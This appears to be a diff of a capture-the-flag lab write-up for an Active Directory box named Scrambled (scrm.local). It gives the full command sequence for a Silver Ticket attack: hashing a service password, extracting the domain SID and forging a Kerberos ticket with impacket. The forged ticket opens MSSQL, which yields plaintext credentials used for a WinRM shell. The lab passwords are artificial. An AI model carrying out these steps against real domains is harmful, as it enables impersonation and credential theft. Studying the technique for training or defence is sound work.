@@ -35,6 +35,7 @@ PORT      STATE SERVICE
 1433/tcp  open  ms-sql-s
 3268/tcp  open  globalcatLDAP
 3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
 9389/tcp  open  adws
 49668/tcp open  unknown
 49673/tcp open  unknown
@@ -405,7 +406,405 @@ Stopped: Tue Sep 12 20:04:08 2023
 ```
 
 - We have `sqlsvc:Pegasus60`
-- 
-## User
+  - But the creds doesn't give anything
+  - We can perform `Silver Ticket` attack
+    - `The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user.`
+    - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
+  - We need: 
+    - `NTLM` hash
+    - The `SID` of the domain
+    - `SPN` of the account
+  - Let's convert password to `NTLM`
+    - https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html
+```
+└─$ iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
+MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
+```
+
+![](./images/8.png)
+
+- Let's get `SID` of the domain
+```
+└─$ ldapsearch -H ldap://dc1.scrm.local -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local"                          
+ldap_bind: Strong(er) authentication required (8)
+        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563
+```
+
+- I need to download the certificate
+
+```
+└─$ openssl s_client -connect dc1.scrm.local:636 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' 
+depth=0 CN = DC1.scrm.local
+verify error:num=20:unable to get local issuer certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify error:num=21:unable to verify the first certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify return:1
+-----BEGIN CERTIFICATE-----
+MIIGHDCCBQSgAwIBAgITEgAAAAOnziQ14yF6dQAAAAAAAzANBgkqhkiG9w0BAQUF
+ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
+MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMzA5MTIyMjU4MjVaFw0yNDA5MTEy
+MjU4MjVaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
+AQEFAAOCAQ8AMIIBCgKCAQEAwVjLBnJ5jxlXIaflyk+A/cjJL+459zVrtlS1O+6g
+XuHi4dK/FgI57emiUM6w5HWcN0+BqFdkqiyBLKN8ciWuNVZ9yIT2SScoldyj2PHc
+y8C8it7zHuiflgTtVwgxNzGsLNm326viZPxOcHYZMlxgZLj+1HgUCgRhz7XlLjJX
+K3n7dsClvER5v+XzM7j2rx0LbdMgZ4SHWVQVkrWp4DK04hWRdo/T+lxS40lKfJ8X
+U4MA0Nn9dEyE09Hwbue8ikiRYNhV7Ea4Fb5pDuOe3zVTobIazAhnOqAHaa7COXPx
+Y3qckhHDuhh0uVTO73PKV2uhePOOenHvdW3eBUtyi279zQIDAQABo4IDMTCCAy0w
+LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
+eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
+AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUTCZWTY3oLpQFrXlk
+rF5NdzbBjpYwHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
+HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
+LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
+Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
+Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
+MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
+cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
+ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
+aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
+OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
+LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
+MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
+KoZIhvcNAQEFBQADggEBAHejAv0dYre1sg5vNiwwWwlI8U4a/9MWkTSdMCUe+JEu
+dPAdZKIEzsPkFIHIAl5+S5Yb/aPNtekGvEyLJ5k2f14YJg5b2iscS6pgVTYsAEGp
+z6pjy1DNUIeDuk7RDoKFG+yYwxc24K1RchkbKLZhQdDkZ7KJlkN9cnV0ioVWLLmy
+R6WUrzxggnkC4B4dPWqR2QVki88DorQt961ccAZF/KegcjUK2iZ8+y8jiukT51oV
+UaZIXMP0j8qs/sW0Vn4WCL0Iv1pzj4D2l4qTHoPR5tcC5qMQVNrYTquq567o+JZS
+2XWj/FmV8lo3bu4B3zfoPQBJYUqQVrKzfuAqYyyp9os=
+-----END CERTIFICATE-----
+DONE            
+```
+```
+└─$ openssl s_client -connect dc1.scrm.local:636 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > scrm.local.crt
+depth=0 CN = DC1.scrm.local
+verify error:num=20:unable to get local issuer certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify error:num=21:unable to verify the first certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify return:1
+DONE
+```
+
+- Edit `/etc/ldap/ldap.conf`
+```
+#
+# LDAP Defaults
+#
+
+# See ldap.conf(5) for details
+# This file should be world readable but not world writable.
+
+#BASE   dc=example,dc=com
+#URI    ldap://ldap.example.com ldap://ldap-provider.example.com:666
+
+#SIZELIMIT      12
+#TIMELIMIT      15
+#DEREF          never
+
+# TLS certificates (needed for GnuTLS)
+#TLS_CACERT     /etc/ssl/certs/ca-certificates.crt
+TLS_CACERT      /home/kali/Documents/tasks/scrm.local.crt
+```
+
+- Let's run `ldapsearch` again
+```
+└─$ ldapsearch -H ldap://dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)" 
+# extended LDIF
+#
+# LDAPv3
+# base <DC=scrm,DC=local> with scope subtree
+# filter: (objectClass=user)
+# requesting: ALL
+#
+
+# Administrator, Users, scrm.local
+dn: CN=Administrator,CN=Users,DC=scrm,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Administrator
+description: Built-in account for administering the computer/domain
+distinguishedName: CN=Administrator,CN=Users,DC=scrm,DC=local
+...
+objectSid:: AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==
+...
+```
+
+- `SID` is in string form
+  - We need to convert it
+  - https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253
+  - https://stackoverflow.com/a/65364978
+     - `S-1-5-21-2743207045-1827831105-2542523200-500`
+```
+import base64
+from samba.dcerpc import security
+from samba.ndr import ndr_unpack
+
+
+base64_sid = "AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA=="
+binary_sid = base64.b64decode(base64_sid)
+
+print(str(ndr_unpack(security.dom_sid, binary_sid)))
+```
+```
+└─$ python3 sid_binary_to_string.py 
+S-1-5-21-2743207045-1827831105-2542523200-500
+```
+
+- We can also use `impacket-getPac` to get the `SID`
+```
+└─$ impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson                      
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+KERB_VALIDATION_INFO 
+LogonTime:                      
+    dwLowDateTime:                   222038284 
+    dwHighDateTime:                  31057291 
+LogoffTime:                     
+    dwLowDateTime:                   4294967295 
+    dwHighDateTime:                  2147483647 
+KickOffTime:                    
+    dwLowDateTime:                   4294967295 
+    dwHighDateTime:                  2147483647 
+PasswordLastSet:                
+    dwLowDateTime:                   2585823167 
+    dwHighDateTime:                  30921784 
+PasswordCanChange:              
+    dwLowDateTime:                   3297396671 
+    dwHighDateTime:                  30921985 
+PasswordMustChange:             
+    dwLowDateTime:                   4294967295 
+    dwHighDateTime:                  2147483647 
+EffectiveName:                   'administrator' 
+...
+ResourceGroupCount:              1 
+ResourceGroupIds:               
+    [
+         
+        RelativeId:                      572 
+        Attributes:                      536870919 ,
+    ] 
+Domain SID: S-1-5-21-2743207045-1827831105-2542523200
+
+ 0000   10 00 00 00 4E F3 44 2B  F2 47 34 D9 3C 0F 53 68   ....N.D+.G4.<.Sh
+```
+
+- Now we have all we need
+  - Let's generate a ticket with `impacket-ticketer`
+```
+└─$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for scrm.local/administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in administrator.ccache
+```
+```
+└─$ klist
+klist: No credentials cache found (filename: /tmp/krb5cc_1000)
+```
+```
+└─$ KRB5CCNAME=administrator.ccache klist
+Ticket cache: FILE:administrator.ccache
+Default principal: administrator@SCRM.LOCAL
+
+Valid starting       Expires              Service principal
+09/13/2023 17:37:26  09/10/2033 17:37:26  MSSQLSvc/dc1.scrm.local:1433@SCRM.LOCAL
+        renew until 09/10/2033 17:37:26
+```
+
+- Let's connect to database using ticket
+```
+└─$ KRB5CCNAME=administrator.ccache impacket-mssqlclient -k dc1.scrm.local
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC1): Line 1: Changed database context to 'master'.
+[*] INFO(DC1): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (SCRM\administrator  dbo@master)>
+```
+
+- Enumerate database
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+```
+SQL (SCRM\administrator  dbo@master)> SELECT name FROM master.dbo.sysdatabases;
+name         
+----------   
+master       
+
+tempdb       
+
+model        
+
+msdb         
+
+ScrambleHR   
+
+SQL (SCRM\administrator  dbo@master)> use ScrambleHR;
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
+[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
+SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT * FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
+TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
+-------------   ------------   ----------   ----------   
+ScrambleHR      dbo            Employees    b'BASE TABLE'   
+
+ScrambleHR      dbo            UserImport   b'BASE TABLE'   
+
+ScrambleHR      dbo            Timesheets   b'BASE TABLE'   
+
+SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT * from Employees;
+EmployeeID   FirstName   Surname   Title   Manager   Role   
+----------   ---------   -------   -----   -------   ----   
+SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT * from UserImport;
+LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
+--------   -----------------   ----------   ---------------   -------------   
+MiscSvc    ScrambledEggs9900   scrm.local                90               0   
+
+SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT * from Timesheets;
+EmployeeID   TimeStart   TimeEnd   
+----------   ---------   -------   
+
+```
+
+- We have creds, let's try `winrm`
+```
+└─$ evil-winrm -h                                            
+                                        
+Evil-WinRM shell v3.5
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
+    -S, --ssl                        Enable ssl
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required if not using kerberos)
+    -p, --password PASS              Password
+    -H, --hash HASH                  NTHash
+    -P, --port PORT                  Remote host port (default 5985)
+    -V, --version                    Show version
+    -n, --no-colors                  Disable colors
+    -N, --no-rpath-completion        Disable remote path completion
+    -l, --log                        Log the WinRM session
+    -h, --help                       Display this help message
+
+```
+
+- We need to change add `SCRM.LOCAL` realm in `/etc/krb5.conf`
+```
+└─$ cat /etc/krb5.conf                                                   
+[libdefaults]
+        default_realm = SCRM.LOCAL 
+
+# The following krb5.conf variables are only for MIT Kerberos.
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
+
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+        fcc-mit-ticketflags = true
+
+[realms]
+        SCRM.LOCAL = {
+                kdc = dc1.scrm.local
+                master_kdc = dc1.scrm.local
+                admin_server = dc1.scrm.local
+                default_domain = dc1.scrm.local
+        }
+
+[domain_realm]
+        .scrm.local = SCRM.LOCAL
+        scrm.local = SCRM.LOCAL
+
+```
+
+- Now, let's get get ticket
+  - `MiscSvc:ScrambledEggs9900`
+```
+└─$ impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900 -dc-ip dc1.scrm.local                                                                                                              
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in MiscSvc.ccache
+```
+
+![](./images/9.png)
 
 ## Root
+- `whoami`
+```
+*Evil-WinRM* PS C:\Users\miscsvc\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+SCRM\ITShare                                Group            S-1-5-21-2743207045-1827831105-2542523200-1609 Mandatory group, Enabled by default, Enabled group
+SCRM\ITUsers                                Group            S-1-5-21-2743207045-1827831105-2542523200-1610 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+```
+
+- Now we can access `IT` share
+  - Inside we have `Sales Order Client` application
+  - Let's download it
+```
+*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> ls
+
+
+    Directory: C:\Shares\IT\Apps\Sales Order Client
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/5/2021   8:52 PM          86528 ScrambleClient.exe
+-a----        11/5/2021   8:52 PM          19456 ScrambleLib.dll
+
+```
+- Let's feed it to `dnspy`
+```
+└─$ file  ScrambleClient.exe 
+ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+```
+
+![](./images/10.png)
+
+- 
